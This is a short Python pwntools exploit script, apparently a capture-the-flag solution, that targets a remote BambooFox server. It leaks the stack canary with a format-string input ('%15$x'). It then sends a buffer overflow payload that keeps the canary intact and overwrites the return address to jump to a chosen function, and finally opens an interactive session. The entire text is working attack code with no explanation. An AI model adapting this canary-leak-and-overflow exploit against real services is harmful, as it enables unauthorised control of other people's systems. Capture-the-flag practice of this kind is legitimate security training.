from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw',22002)

func = 0x0804854d
r.sendline('%15$x')
canary = int(r.recv(), 16)

payload = 'A'*40 + p32(canary) + 'B'*12 + p32(func)

r.sendline(payload)
r.interactive()

